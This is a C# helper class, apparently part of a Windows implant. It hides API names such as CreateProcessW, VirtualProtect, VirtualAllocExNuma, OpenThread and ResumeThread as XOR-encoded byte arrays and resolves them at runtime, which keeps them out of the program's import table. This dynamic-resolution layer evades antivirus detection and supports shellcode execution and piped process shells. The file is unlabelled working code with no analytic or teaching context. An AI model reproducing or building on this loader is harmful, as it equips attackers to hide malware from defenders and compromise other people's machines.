using System;
using System.Runtime.InteropServices;
using System.Text;

namespace SvcUtil
{
    internal static class DynInvoke
    {
        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        private static extern IntPtr LoadLibraryA(string lpFileName);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        private static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

        // ── String decode ───────────────────────────────────────────
        private static readonly byte[] _xk = { 0x71, 0x58, 0x2D, 0x93, 0xA4 };

        private static string D(byte[] c)
        {
            byte[] b = new byte[c.Length];
            for (int i = 0; i < c.Length; i++)
                b[i] = (byte)(c[i] ^ _xk[i % _xk.Length]);
            return Encoding.UTF8.GetString(b);
        }

        // Pre-computed encoded strings
        private static readonly byte[] _k32 = { 0x1A, 0x3D, 0x5F, 0xFD, 0xC1, 0x1D, 0x6B, 0x1F, 0xBD, 0xC0, 0x1D, 0x34 };
        private static readonly byte[] _s00 = { 0x32, 0x2A, 0x48, 0xF2, 0xD0, 0x14, 0x08, 0x5F, 0xFC, 0xC7, 0x14, 0x2B, 0x5E, 0xC4 };
        private static readonly byte[] _s01 = { 0x32, 0x2A, 0x48, 0xF2, 0xD0, 0x14, 0x08, 0x44, 0xE3, 0xC1 };
        private static readonly byte[] _s02 = { 0x32, 0x34, 0x42, 0xE0, 0xC1, 0x39, 0x39, 0x43, 0xF7, 0xC8, 0x14 };
        private static readonly byte[] _s03 = { 0x35, 0x2D, 0x5D, 0xFF, 0xCD, 0x12, 0x39, 0x59, 0xF6, 0xEC, 0x10, 0x36, 0x49, 0xFF, 0xC1 };
        private static readonly byte[] _s04 = { 0x36, 0x3D, 0x59, 0xD0, 0xD1, 0x03, 0x2A, 0x48, 0xFD, 0xD0, 0x21, 0x2A, 0x42, 0xF0, 0xC1, 0x02, 0x2B };
        private static readonly byte[] _s05 = { 0x21, 0x3D, 0x48, 0xF8, 0xEA, 0x10, 0x35, 0x48, 0xF7, 0xF4, 0x18, 0x28, 0x48 };
        private static readonly byte[] _s06 = { 0x23, 0x3D, 0x4C, 0xF7, 0xE2, 0x18, 0x34, 0x48 };
        private static readonly byte[] _s07 = { 0x26, 0x2A, 0x44, 0xE7, 0xC1, 0x37, 0x31, 0x41, 0xF6 };
        private static readonly byte[] _s08 = { 0x26, 0x39, 0x44, 0xE7, 0xE2, 0x1E, 0x2A, 0x7E, 0xFA, 0xCA, 0x16, 0x34, 0x48, 0xDC, 0xC6, 0x1B, 0x3D, 0x4E, 0xE7 };
        private static readonly byte[] _s09 = { 0x27, 0x31, 0x5F, 0xE7, 0xD1, 0x10, 0x34, 0x7D, 0xE1, 0xCB, 0x05, 0x3D, 0x4E, 0xE7 };
        private static readonly byte[] _s10 = { 0x27, 0x31, 0x5F, 0xE7, 0xD1, 0x10, 0x34, 0x6C, 0xFF, 0xC8, 0x1E, 0x3B };
        private static readonly byte[] _s11 = { 0x27, 0x31, 0x5F, 0xE7, 0xD1, 0x10, 0x34, 0x6B, 0xE1, 0xC1, 0x14 };
        private static readonly byte[] _s12 = { 0x27, 0x31, 0x5F, 0xE7, 0xD1, 0x10, 0x34, 0x6C, 0xFF, 0xC8, 0x1E, 0x3B, 0x68, 0xEB, 0xEA, 0x04, 0x35, 0x4C };
        private static readonly byte[] _s13 = { 0x37, 0x34, 0x5E, 0xD2, 0xC8, 0x1D, 0x37, 0x4E };
        private static readonly byte[] _s14 = { 0x37, 0x34, 0x5E, 0xD5, 0xD6, 0x14, 0x3D };
        private static readonly byte[] _s15 = { 0x36, 0x3D, 0x59, 0xC7, 0xCD, 0x12, 0x33, 0x6E, 0xFC, 0xD1, 0x1F, 0x2C, 0x1B, 0xA7 };
        private static readonly byte[] _s16 = { 0x32, 0x2A, 0x48, 0xF2, 0xD0, 0x14, 0x0C, 0x42, 0xFC, 0xC8, 0x19, 0x3D, 0x41, 0xE3, 0x97, 0x43, 0x0B, 0x43, 0xF2, 0xD4, 0x02, 0x30, 0x42, 0xE7 };
        private static readonly byte[] _s17 = { 0x25, 0x30, 0x5F, 0xF6, 0xC5, 0x15, 0x6B, 0x1F, 0xD5, 0xCD, 0x03, 0x2B, 0x59 };
        private static readonly byte[] _s18 = { 0x25, 0x30, 0x5F, 0xF6, 0xC5, 0x15, 0x6B, 0x1F, 0xDD, 0xC1, 0x09, 0x2C };
        private static readonly byte[] _s19 = { 0x3E, 0x28, 0x48, 0xFD, 0xF0, 0x19, 0x2A, 0x48, 0xF2, 0xC0 };

        private static IntPtr _hKernel32 = IntPtr.Zero;

        private static IntPtr Kernel32
        {
            get
            {
                if (_hKernel32 == IntPtr.Zero)
                    _hKernel32 = LoadLibraryA(D(_k32));
                return _hKernel32;
            }
        }

        private static Delegate GetFunc(byte[] enc, Type delegateType)
        {
            IntPtr addr = GetProcAddress(Kernel32, D(enc));
            if (addr == IntPtr.Zero)
                throw new EntryPointNotFoundException();
            return Marshal.GetDelegateForFunctionPointer(addr, delegateType);
        }

        // ── Delegate signatures ──────────────────────────────────────

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true, CharSet = CharSet.Unicode)]
        public delegate bool DCreateProcessW(
            string lpApplicationName, string lpCommandLine,
            IntPtr lpProcessAttributes, IntPtr lpThreadAttributes,
            bool bInheritHandles, uint dwCreationFlags,
            IntPtr lpEnvironment, string lpCurrentDirectory,
            ref Shell.STARTUPINFO lpStartupInfo,
            out Shell.PROCESS_INFORMATION lpProcessInformation);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        public delegate bool DCreatePipe(
            ref IntPtr hReadPipe, ref IntPtr hWritePipe,
            IntPtr lpPipeAttributes, int nSize);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        public delegate bool DCloseHandle(IntPtr handle);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        public delegate bool DDuplicateHandle(
            IntPtr hSourceProcess, IntPtr hSource,
            IntPtr hTargetProcess, ref IntPtr hTarget,
            int dwDesiredAccess, bool bInheritHandle, int dwOptions);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        public delegate IntPtr DGetCurrentProcess();

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        public delegate bool DPeekNamedPipe(
            IntPtr hNamedPipe, byte[] lpBuffer, int nBufferSize,
            out int lpBytesRead, out int lpTotalBytesAvail,
            IntPtr lpBytesLeftThisMessage);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        public delegate bool DReadFile(
            IntPtr hFile, byte[] lpBuffer, int nNumberOfBytesToRead,
            out int lpNumberOfBytesRead, IntPtr lpOverlapped);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        public delegate bool DWriteFile(
            IntPtr hFile, byte[] lpBuffer, uint nNumberOfBytesToWrite,
            out int lpNumberOfBytesWritten, IntPtr lpOverlapped);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        public delegate int DWaitForSingleObject(IntPtr hHandle, int dwMilliseconds);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        public delegate bool DVirtualProtect(
            IntPtr lpAddress, UIntPtr dwSize,
            uint flNewProtect, out uint lpflOldProtect);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        public delegate IntPtr DVirtualAlloc(
            IntPtr lpAddress, UIntPtr dwSize,
            uint flAllocationType, uint flProtect);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        public delegate bool DVirtualFree(
            IntPtr lpAddress, UIntPtr dwSize, uint dwFreeType);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        public delegate IntPtr DVirtualAllocExNuma(
            IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize,
            uint flAllocationType, uint flProtect, uint nndPreferred);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        public delegate uint DFlsAlloc(IntPtr callback);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        public delegate bool DFlsFree(uint dwFlsIndex);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate ulong DGetTickCount64();

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        public delegate IntPtr DCreateToolhelp32Snapshot(
            uint dwFlags, uint th32ProcessID);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        public delegate bool DThread32First(IntPtr hSnapshot, IntPtr lpte);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        public delegate bool DThread32Next(IntPtr hSnapshot, IntPtr lpte);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        public delegate IntPtr DOpenThread(
            uint dwDesiredAccess, bool bInheritHandle, uint dwThreadId);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        public delegate uint DResumeThread(IntPtr hThread);

        // ── Cached instances ─────────────────────────────────────────

        private static DCreateProcessW _createProcessW;
        private static DCreatePipe _createPipe;
        private static DCloseHandle _closeHandle;
        private static DDuplicateHandle _duplicateHandle;
        private static DGetCurrentProcess _getCurrentProcess;
        private static DPeekNamedPipe _peekNamedPipe;
        private static DReadFile _readFile;
        private static DWriteFile _writeFile;
        private static DWaitForSingleObject _waitForSingleObject;
        private static DVirtualProtect _virtualProtect;
        private static DVirtualAlloc _virtualAlloc;
        private static DVirtualFree _virtualFree;
        private static DVirtualAllocExNuma _virtualAllocExNuma;
        private static DFlsAlloc _flsAlloc;
        private static DFlsFree _flsFree;
        private static DGetTickCount64 _getTickCount64;
        private static DCreateToolhelp32Snapshot _createToolhelp32Snapshot;
        private static DThread32First _thread32First;
        private static DThread32Next _thread32Next;
        private static DOpenThread _openThread;
        private static DResumeThread _resumeThread;
        private static readonly byte[] _s20 = { 0x23, 0x3D, 0x5E, 0xE6, 0xC9, 0x14, 0x0C, 0x45, 0xE1, 0xC1, 0x10, 0x3C };

        // ── Public wrappers for external module resolution ───────────

        public static IntPtr LoadLib(string dllName) { return LoadLibraryA(dllName); }

        public static IntPtr GetProc(IntPtr hModule, string procName)
        {
            return GetProcAddress(hModule, procName);
        }

        // ── Public accessors (runtime resolved) ─────────────────────

        public static DCreateProcessW CreateProcessW
        {
            get
            {
                if (_createProcessW == null)
                    _createProcessW = (DCreateProcessW)GetFunc(_s00, typeof(DCreateProcessW));
                return _createProcessW;
            }
        }

        public static DCreatePipe CreatePipe
        {
            get
            {
                if (_createPipe == null)
                    _createPipe = (DCreatePipe)GetFunc(_s01, typeof(DCreatePipe));
                return _createPipe;
            }
        }

        public static DCloseHandle CloseHandle
        {
            get
            {
                if (_closeHandle == null)
                    _closeHandle = (DCloseHandle)GetFunc(_s02, typeof(DCloseHandle));
                return _closeHandle;
            }
        }

        public static DDuplicateHandle DuplicateHandle
        {
            get
            {
                if (_duplicateHandle == null)
                    _duplicateHandle = (DDuplicateHandle)GetFunc(_s03, typeof(DDuplicateHandle));
                return _duplicateHandle;
            }
        }

        public static DGetCurrentProcess GetCurrentProcess
        {
            get
            {
                if (_getCurrentProcess == null)
                    _getCurrentProcess = (DGetCurrentProcess)GetFunc(_s04, typeof(DGetCurrentProcess));
                return _getCurrentProcess;
            }
        }

        public static DPeekNamedPipe PeekNamedPipe
        {
            get
            {
                if (_peekNamedPipe == null)
                    _peekNamedPipe = (DPeekNamedPipe)GetFunc(_s05, typeof(DPeekNamedPipe));
                return _peekNamedPipe;
            }
        }

        public static DReadFile ReadFile
        {
            get
            {
                if (_readFile == null)
                    _readFile = (DReadFile)GetFunc(_s06, typeof(DReadFile));
                return _readFile;
            }
        }

        public static DWriteFile WriteFile
        {
            get
            {
                if (_writeFile == null)
                    _writeFile = (DWriteFile)GetFunc(_s07, typeof(DWriteFile));
                return _writeFile;
            }
        }

        public static DWaitForSingleObject WaitForSingleObject
        {
            get
            {
                if (_waitForSingleObject == null)
                    _waitForSingleObject = (DWaitForSingleObject)GetFunc(_s08, typeof(DWaitForSingleObject));
                return _waitForSingleObject;
            }
        }

        public static DVirtualProtect VirtualProtect
        {
            get
            {
                if (_virtualProtect == null)
                    _virtualProtect = (DVirtualProtect)GetFunc(_s09, typeof(DVirtualProtect));
                return _virtualProtect;
            }
        }

        public static IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize,
            uint flAllocationType, uint flProtect)
        {
            if (_virtualAlloc == null)
                _virtualAlloc = (DVirtualAlloc)GetFunc(_s10, typeof(DVirtualAlloc));
            return _virtualAlloc(lpAddress, dwSize, flAllocationType, flProtect);
        }

        public static bool VirtualFree(IntPtr lpAddress, UIntPtr dwSize,
            uint dwFreeType)
        {
            if (_virtualFree == null)
                _virtualFree = (DVirtualFree)GetFunc(_s11, typeof(DVirtualFree));
            return _virtualFree(lpAddress, dwSize, dwFreeType);
        }

        public static IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress,
            UIntPtr dwSize, uint flAllocationType, uint flProtect,
            uint nndPreferred)
        {
            if (_virtualAllocExNuma == null)
                _virtualAllocExNuma = (DVirtualAllocExNuma)GetFunc(_s12, typeof(DVirtualAllocExNuma));
            return _virtualAllocExNuma(hProcess, lpAddress, dwSize, flAllocationType, flProtect, nndPreferred);
        }

        public static uint FlsAlloc(IntPtr callback)
        {
            if (_flsAlloc == null)
                _flsAlloc = (DFlsAlloc)GetFunc(_s13, typeof(DFlsAlloc));
            return _flsAlloc(callback);
        }

        public static bool FlsFree(uint dwFlsIndex)
        {
            if (_flsFree == null)
                _flsFree = (DFlsFree)GetFunc(_s14, typeof(DFlsFree));
            return _flsFree(dwFlsIndex);
        }

        public static ulong GetTickCount64()
        {
            if (_getTickCount64 == null)
                _getTickCount64 = (DGetTickCount64)GetFunc(_s15, typeof(DGetTickCount64));
            return _getTickCount64();
        }

        public static IntPtr CreateToolhelp32Snapshot(uint dwFlags, uint th32ProcessID)
        {
            if (_createToolhelp32Snapshot == null)
                _createToolhelp32Snapshot = (DCreateToolhelp32Snapshot)GetFunc(_s16, typeof(DCreateToolhelp32Snapshot));
            return _createToolhelp32Snapshot(dwFlags, th32ProcessID);
        }

        public static bool Thread32First(IntPtr hSnapshot, IntPtr lpte)
        {
            if (_thread32First == null)
                _thread32First = (DThread32First)GetFunc(_s17, typeof(DThread32First));
            return _thread32First(hSnapshot, lpte);
        }

        public static bool Thread32Next(IntPtr hSnapshot, IntPtr lpte)
        {
            if (_thread32Next == null)
                _thread32Next = (DThread32Next)GetFunc(_s18, typeof(DThread32Next));
            return _thread32Next(hSnapshot, lpte);
        }

        public static IntPtr OpenThread(uint dwDesiredAccess, bool bInheritHandle,
            uint dwThreadId)
        {
            if (_openThread == null)
                _openThread = (DOpenThread)GetFunc(_s19, typeof(DOpenThread));
            return _openThread(dwDesiredAccess, bInheritHandle, dwThreadId);
        }

        public static uint ResumeThread(IntPtr hThread)
        {
            if (_resumeThread == null)
                _resumeThread = (DResumeThread)GetFunc(_s20, typeof(DResumeThread));
            return _resumeThread(hThread);
        }
    }
}
